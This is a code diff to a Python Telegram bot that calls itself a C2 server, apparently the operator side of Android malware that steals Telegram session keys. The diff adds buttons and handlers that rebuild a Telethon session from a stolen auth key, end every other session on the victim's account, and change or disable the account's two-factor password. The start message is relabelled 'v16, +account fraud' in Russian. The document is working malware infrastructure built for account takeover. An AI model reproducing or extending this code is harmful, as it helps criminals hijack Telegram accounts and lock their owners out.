@@ -14,8 +14,12 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, FSInputFile, InlineKeyboardMarkup
 from aiogram.filters import CommandStart
 from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.storage.memory import MemoryStorage
 from telethon import TelegramClient
 from telethon.errors import AuthKeyUnregisteredError
+from telethon.tl import functions as tl_functions
 # from opentele.td import TDesktop, Account  # lazy import inside function
 # from opentele.td.configs import DcId       # lazy import inside function
 # from opentele.td.auth import AuthKey, AuthKeyType  # lazy import inside function
@@ -53,6 +57,10 @@ DC_IP_MAP = {
     1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100",
     4: "149.154.167.91", 5: "91.108.56.130",
 }
+
+class Change2FAStates(StatesGroup):
+    waiting_current = State()
+    waiting_new = State()
 
 def create_telethon_session_file(session_file_path: Path, auth_key_hex: str, dc_id: int):
     auth_key = bytes.fromhex(auth_key_hex)
@@ -149,6 +157,8 @@ async def process_credentials(bot: Bot, data: dict):
         builder.button(text="Проверить валидность", callback_data=f"check:{session_uuid}")
         builder.button(text="Telethon (.session)", callback_data=f"convert:telethon:{session_uuid}")
         builder.button(text="TData (.zip)", callback_data=f"convert:tdata:{session_uuid}")
+        builder.button(text="Сбросить другие сессии", callback_data=f"terminate_others:{session_uuid}")
+        builder.button(text="Изменить 2FA пароль", callback_data=f"change2fa:{session_uuid}")
         builder.button(text="🗑 Сбросить сессию", callback_data=f"reset:{android_id}")
         builder.adjust(1)
 
@@ -216,11 +226,11 @@ async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
             del CONNECTED_CLIENTS[android_id]
 
 # --- Обработчики Telegram бота (aiogram) ---
-dp = Dispatcher()
+dp = Dispatcher(storage=MemoryStorage())
 
 @dp.message(CommandStart())
 async def command_start_handler(message: Message):
-    await message.answer(f"✅ C2-сервер (v15, Исправленный) активен.\nВаш Chat ID: `{message.chat.id}`", parse_mode="Markdown")
+    await message.answer(f"✅ C2-сервер (v16, +аккаунт-махинации) активен.\nВаш Chat ID: `{message.chat.id}`", parse_mode="Markdown")
 
 @dp.callback_query(F.data.startswith("convert:"))
 async def handle_conversion_callback(query: CallbackQuery):
@@ -304,6 +314,90 @@ async def handle_reset_callback(query: CallbackQuery):
         await query.message.edit_text(query.message.text + f"\n\n*✅ Команда на сброс отправлена устройству `{android_id}`.*", parse_mode="Markdown")
     else:
         await query.message.reply(f"❌ Устройство `{android_id}` не в сети. Команда не может быть доставлена.", parse_mode="Markdown")
+
+@dp.callback_query(F.data.startswith("terminate_others:"))
+async def handle_terminate_others(query: CallbackQuery):
+    await query.answer("Сбрасываю другие сессии...")
+    _, session_uuid = query.data.split(":")
+    session_data = database.get_session_data(session_uuid)
+    if not session_data:
+        return await query.message.reply("❌ Сессия не найдена в БД.")
+
+    auth_key_hex, dc_id, _ = session_data
+    temp_dir = TEMP_ROOT / f"terminate_{session_uuid}"
+    temp_dir.mkdir(exist_ok=True)
+
+    session_file_path = temp_dir / "terminate.session"
+    client = None
+    try:
+        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
+        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
+        await client.connect()
+        await client(tl_functions.auth.ResetAuthorizationsRequest())
+        await query.message.reply("✅ Все другие сессии завершены. Эта сессия осталась активной.")
+    except Exception as e:
+        logger.error(f"Terminate others failed for {session_uuid}: {e}")
+        await query.message.reply(f"❌ Не удалось завершить другие сессии: `{e}`", parse_mode="Markdown")
+    finally:
+        if client and client.is_connected():
+            await client.disconnect()
+        if temp_dir.exists():
+            shutil.rmtree(temp_dir)
+
+@dp.callback_query(F.data.startswith("change2fa:"))
+async def handle_change2fa_start(query: CallbackQuery, state: FSMContext):
+    await query.answer("Начинаю смену 2FA...")
+    _, session_uuid = query.data.split(":")
+    await state.update_data(session_uuid=session_uuid)
+    await state.set_state(Change2FAStates.waiting_current)
+    await query.message.reply(
+        "Введите текущий 2FA пароль, или отправьте 'none' если 2FA не установлен.")
+
+@dp.message(Change2FAStates.waiting_current)
+async def handle_change2fa_current(message: Message, state: FSMContext):
+    current_raw = (message.text or "").strip()
+    current_password = None if current_raw.lower() == 'none' else current_raw
+    await state.update_data(current_password=current_password)
+    await state.set_state(Change2FAStates.waiting_new)
+    await message.reply("Введите новый 2FA пароль, или отправьте 'none' чтобы отключить 2FA.")
+
+@dp.message(Change2FAStates.waiting_new)
+async def handle_change2fa_new(message: Message, state: FSMContext):
+    data = await state.get_data()
+    session_uuid = data.get("session_uuid")
+    current_password = data.get("current_password")
+    new_raw = (message.text or "").strip()
+    new_password = None if new_raw.lower() == 'none' else new_raw
+
+    session_data = database.get_session_data(session_uuid)
+    if not session_data:
+        await state.clear()
+        return await message.reply("❌ Сессия не найдена в БД.")
+
+    auth_key_hex, dc_id, _ = session_data
+    temp_dir = TEMP_ROOT / f"change2fa_{session_uuid}"
+    temp_dir.mkdir(exist_ok=True)
+
+    session_file_path = temp_dir / "change2fa.session"
+    client = None
+    try:
+        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
+        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
+        await client.connect()
+        await client.edit_2fa(new_password=new_password, current_password=current_password)
+        if new_password is None:
+            await message.reply("✅ 2FA пароль отключён.")
+        else:
+            await message.reply("✅ 2FA пароль успешно изменён.")
+    except Exception as e:
+        logger.error(f"Change 2FA failed for {session_uuid}: {e}")
+        await message.reply(f"❌ Не удалось изменить 2FA: `{e}`", parse_mode="Markdown")
+    finally:
+        if client and client.is_connected():
+            await client.disconnect()
+        if temp_dir.exists():
+            shutil.rmtree(temp_dir)
+        await state.clear()
 
 # --- Главная функция запуска ---
 async def main():
